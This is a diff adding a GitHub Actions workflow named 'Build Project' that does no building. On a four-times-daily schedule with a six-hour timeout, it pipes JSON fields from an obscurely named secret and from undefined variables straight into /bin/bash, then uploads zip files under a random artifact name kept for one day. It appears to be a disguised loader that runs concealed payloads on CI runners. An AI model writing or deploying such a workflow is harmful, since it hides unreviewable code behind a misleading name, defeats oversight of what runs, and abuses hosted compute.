@@ -1,0 +1,34 @@
+name: Build Project
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '53 4,10,16,22 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Perform
+        env:
+          vv7099: ${{ secrets.vv7099 }}
+        run: |
+          printf '%s' "$vv7099" | jq -r .lgw73337 | /bin/bash
+          printf '%s' "$gq0" | jq -r .zkgf8490 | /bin/bash
+          printf '%s' "$ptl86" | jq -r .n32 | /bin/bash
+          printf '%s' "$tla008" | jq -r .wzi9 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: VjMUQlXO
+          path: "*.zip"
+          retention-days: 1
